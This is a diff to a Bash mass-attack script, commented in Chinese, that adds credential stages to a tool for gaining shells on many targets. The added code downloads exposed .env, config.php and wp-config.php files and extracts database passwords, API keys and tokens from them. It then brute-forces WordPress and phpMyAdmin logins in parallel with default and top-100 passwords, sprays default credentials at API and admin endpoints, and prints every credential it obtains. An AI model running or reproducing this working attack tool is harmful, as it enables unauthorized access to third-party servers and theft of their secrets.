@@ -1,9 +1,11 @@
 #!/bin/bash
-# 最大化Shell + 极低误报
-# 核心：五重验证 + 内容验证 + 智能并发
+# 最大化Shell + 极低误报 + 凭证爆破
+# 核心：五重验证 + 内容验证 + 智能并发 + 凭证复用
 
 source /root/.api_keys
 PASS_DICT="/root/passwords/master_passwords.txt"
+TOP100="/root/passwords/top100.txt"
+DEFAULT_CREDS="/root/passwords/default_creds.txt"
 
 OUT="/root/max_shell_$(date +%Y%m%d_%H%M%S)"
 mkdir -p $OUT/shells
@@ -22,7 +24,8 @@ echo "━━━━━━━━━━━━━━━━━━━━━━━━�
 echo "🔥 最大化Shell + 极低误报"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo "目标: $TOTAL"
-echo "策略: 高价值优先 + 五重验证 + 内容验证"
+echo "策略: 高价值优先 + 五重验证 + 内容验证 + 凭证爆破"
+echo "字典: master_passwords.txt + top100.txt + default_creds.txt"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
 # ==========================================
@@ -303,13 +306,173 @@ BACKUP=$(wc -l < $OUT/shells/08_backup.txt 2>/dev/null || echo 0)
 echo "  ✅ 备份文件: $BACKUP"
 
 # ==========================================
+# 9. 凭证提取与复用（从.env/config.php）
+# ==========================================
+echo "[9/12] 🔑 凭证提取与复用..."
+mkdir -p $OUT/shells/creds
+
+# 从.env文件提取凭证
+[ -f $OUT/shells/02_env.txt ] && cat $OUT/shells/02_env.txt | while read env_url; do
+    env_content=$(curl -skL -m 5 "$env_url" 2>/dev/null)
+    # 提取数据库凭证
+    echo "$env_content" | grep -iE "DB_PASSWORD|DB_PASS|PASSWORD|SECRET" | grep -v "^#" | \
+        sed 's/.*=//' | tr -d ' "\047' | grep -v "^$" >> $OUT/shells/creds/env_passwords.txt 2>/dev/null
+    # 提取API密钥
+    echo "$env_content" | grep -iE "API_KEY|SECRET_KEY|TOKEN" | grep -v "^#" | \
+        sed 's/.*=//' | tr -d ' "\047' | grep -v "^$" >> $OUT/shells/creds/env_keys.txt 2>/dev/null
+done
+
+# 从config.php提取凭证
+[ -f $OUT/shells/02_config.txt ] && cat $OUT/shells/02_config.txt | while read config_url; do
+    config_content=$(curl -skL -m 5 "$config_url" 2>/dev/null)
+    # 提取密码
+    echo "$config_content" | grep -iE "password|passwd" | grep -oE "['\"][^'\"]*['\"]" | \
+        tr -d '"\047' | grep -v "^$" >> $OUT/shells/creds/config_passwords.txt 2>/dev/null
+done
+
+# 从wp-config.php提取数据库凭证
+[ -f $OUT/shells/02_wpconfig.txt ] && cat $OUT/shells/02_wpconfig.txt | while read wpconfig_url; do
+    wp_content=$(curl -skL -m 5 "$wpconfig_url" 2>/dev/null)
+    # 提取DB_PASSWORD
+    echo "$wp_content" | grep -iE "DB_PASSWORD" | grep -oE "['\"][^'\"]*['\"]" | \
+        tr -d '"\047' | grep -v "^$" >> $OUT/shells/creds/wp_db_passwords.txt 2>/dev/null
+    # 提取DB_USER
+    echo "$wp_content" | grep -iE "DB_USER" | grep -oE "['\"][^'\"]*['\"]" | \
+        tr -d '"\047' | grep -v "^$" >> $OUT/shells/creds/wp_db_users.txt 2>/dev/null
+done
+
+ENV_PASS=$(wc -l < $OUT/shells/creds/env_passwords.txt 2>/dev/null || echo 0)
+CONFIG_PASS=$(wc -l < $OUT/shells/creds/config_passwords.txt 2>/dev/null || echo 0)
+WP_PASS=$(wc -l < $OUT/shells/creds/wp_db_passwords.txt 2>/dev/null || echo 0)
+echo "  ✅ 提取凭证: env:$ENV_PASS config:$CONFIG_PASS wp:$WP_PASS"
+
+# ==========================================
+# 10. WordPress弱口令爆破（智能字典）
+# ==========================================
+echo "[10/12] 🔓 WordPress弱口令（智能字典，并发10）..."
+[ -f $OUT/shells/05_wordpress.txt ] && cat $OUT/shells/05_wordpress.txt | head -100 | xargs -P 10 -I {} bash -c '
+    url="{}"
+    wp_login="${url}/wp-login.php"
+    
+    # 先测试默认凭证（快速）
+    for cred in "admin:admin" "admin:password" "admin:123456" "admin:admin123" \
+                "administrator:administrator" "root:root" "test:test"; do
+        user=$(echo $cred | cut -d: -f1)
+        pass=$(echo $cred | cut -d: -f2)
+        
+        resp=$(curl -skL -m 5 "$wp_login" -d "log=$user&pwd=$pass&wp-submit=Log+In" \
+            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
+        
+        if ! echo "$resp" | grep -qiE "incorrect|error|invalid|login" && \
+           echo "$resp" | grep -qiE "dashboard|admin|wp-admin"; then
+            echo "$url|$user:$pass" >> '"$OUT"'/shells/10_wp_creds.txt
+            exit 0
+        fi
+    done
+    
+    # 再测试top100密码（admin用户）
+    [ -f '"$TOP100"' ] && while read pass; do
+        resp=$(curl -skL -m 4 "$wp_login" -d "log=admin&pwd=$pass&wp-submit=Log+In" \
+            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
+        
+        if ! echo "$resp" | grep -qiE "incorrect|error|invalid" && \
+           echo "$resp" | grep -qiE "dashboard|admin"; then
+            echo "$url|admin:$pass" >> '"$OUT"'/shells/10_wp_creds.txt
+            exit 0
+        fi
+    done < '"$TOP100"'
+' &
+wait
+WP_CREDS=$(wc -l < $OUT/shells/10_wp_creds.txt 2>/dev/null || echo 0)
+echo "  ✅ WordPress凭证: $WP_CREDS"
+
+# ==========================================
+# 11. phpMyAdmin弱口令爆破（智能字典）
+# ==========================================
+echo "[11/12] 🔓 phpMyAdmin弱口令（智能字典，并发10）..."
+[ -f $OUT/shells/06_phpmyadmin.txt ] && cat $OUT/shells/06_phpmyadmin.txt | head -50 | xargs -P 10 -I {} bash -c '
+    url="{}"
+    
+    # 先测试默认凭证
+    for cred in "root:" "root:root" "root:password" "root:123456" \
+                "admin:admin" "admin:password" "root:toor"; do
+        user=$(echo $cred | cut -d: -f1)
+        pass=$(echo $cred | cut -d: -f2)
+        
+        # phpMyAdmin登录
+        resp=$(curl -skL -m 5 "$url" -d "pma_username=$user&pma_password=$pass" \
+            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
+        
+        if ! echo "$resp" | grep -qiE "cannot|error|access denied" && \
+           echo "$resp" | grep -qiE "main|database|server"; then
+            echo "$url|$user:$pass" >> '"$OUT"'/shells/11_pma_creds.txt
+            exit 0
+        fi
+    done
+    
+    # 测试空密码
+    resp=$(curl -skL -m 5 "$url" -d "pma_username=root&pma_password=" \
+        -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
+    if ! echo "$resp" | grep -qiE "cannot|error" && \
+       echo "$resp" | grep -qiE "main|database"; then
+        echo "$url|root:" >> '"$OUT"'/shells/11_pma_creds.txt
+        exit 0
+    fi
+    
+    # 测试top100（root用户）
+    [ -f '"$TOP100"' ] && while read pass; do
+        resp=$(curl -skL -m 4 "$url" -d "pma_username=root&pma_password=$pass" \
+            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
+        
+        if ! echo "$resp" | grep -qiE "cannot|error|access denied" && \
+           echo "$resp" | grep -qiE "main|database"; then
+            echo "$url|root:$pass" >> '"$OUT"'/shells/11_pma_creds.txt
+            exit 0
+        fi
+    done < '"$TOP100"'
+' &
+wait
+PMA_CREDS=$(wc -l < $OUT/shells/11_pma_creds.txt 2>/dev/null || echo 0)
+echo "  ✅ phpMyAdmin凭证: $PMA_CREDS"
+
+# ==========================================
+# 12. 默认凭证快速检测（API/管理后台）
+# ==========================================
+echo "[12/12] 🔑 默认凭证检测（API/后台，并发20）..."
+cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
+    url="{}"
+    
+    # API默认凭证测试
+    for api_path in /api/login /api/auth /api/admin/login /admin/login /login; do
+        for cred in "admin:admin" "admin:password" "admin:123456" "root:root"; do
+            user=$(echo $cred | cut -d: -f1)
+            pass=$(echo $cred | cut -d: -f2)
+            
+            resp=$(curl -skL -m 4 "$url$api_path" -X POST \
+                -H "Content-Type: application/json" \
+                -d "{\"username\":\"$user\",\"password\":\"$pass\"}" 2>/dev/null)
+            
+            if echo "$resp" | grep -qiE "token|success|true|200" && \
+               ! echo "$resp" | grep -qiE "error|invalid|incorrect|unauthorized"; then
+                echo "$url$api_path|$user:$pass" >> '"$OUT"'/shells/12_default_creds.txt
+                break 2
+            fi
+        done
+    done
+' &
+wait
+DEFAULT_CREDS_COUNT=$(wc -l < $OUT/shells/12_default_creds.txt 2>/dev/null || echo 0)
+echo "  ✅ 默认凭证: $DEFAULT_CREDS_COUNT"
+
+# ==========================================
 # 统计汇总
 # ==========================================
 TOTAL_SHELLS=$((UPLOAD + FILES + API + GIT_LEAK + SSRF + BACKUP))
+TOTAL_CREDS=$((WP_CREDS + PMA_CREDS + DEFAULT_CREDS_COUNT))
 
 echo ""
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo "🎉 攻击完成（极低误报）"
+echo "🎉 攻击完成（极低误报 + 凭证爆破）"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo "文件上传Shell: $UPLOAD"
 echo "敏感文件: $FILES (.env:$ENV config:$CONFIG wp-config:$WPCONFIG git:$GIT)"
@@ -320,7 +483,14 @@ echo "phpMyAdmin: $PMA"
 echo "SSRF: $SSRF"
 echo "备份文件: $BACKUP"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "凭证爆破:"
+echo "  WordPress凭证: $WP_CREDS"
+echo "  phpMyAdmin凭证: $PMA_CREDS"
+echo "  默认凭证: $DEFAULT_CREDS_COUNT"
+echo "  提取凭证: env:$ENV_PASS config:$CONFIG_PASS wp:$WP_PASS"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo "🎯 总计Shell/漏洞: $TOTAL_SHELLS"
+echo "🎯 总计凭证: $TOTAL_CREDS"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo "结果目录: $OUT/shells/"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
@@ -330,3 +500,7 @@ echo "━━━━━━━━━━━━━━━━━━━━━━━━�
 [ $ENV -gt 0 ] && echo "" && echo "📁 .env文件:" && head -10 $OUT/shells/02_env.txt
 [ $API -gt 0 ] && echo "" && echo "🌐 未授权API:" && head -10 $OUT/shells/03_api.txt
 [ $SSRF -gt 0 ] && echo "" && echo "🔗 SSRF:" && cat $OUT/shells/07_ssrf.txt
+[ $WP_CREDS -gt 0 ] && echo "" && echo "🔑 WordPress凭证:" && cat $OUT/shells/10_wp_creds.txt
+[ $PMA_CREDS -gt 0 ] && echo "" && echo "🔑 phpMyAdmin凭证:" && cat $OUT/shells/11_pma_creds.txt
+[ $DEFAULT_CREDS_COUNT -gt 0 ] && echo "" && echo "🔑 默认凭证:" && head -10 $OUT/shells/12_default_creds.txt
+[ $ENV_PASS -gt 0 ] && echo "" && echo "🔑 提取的密码:" && head -10 $OUT/shells/creds/env_passwords.txt
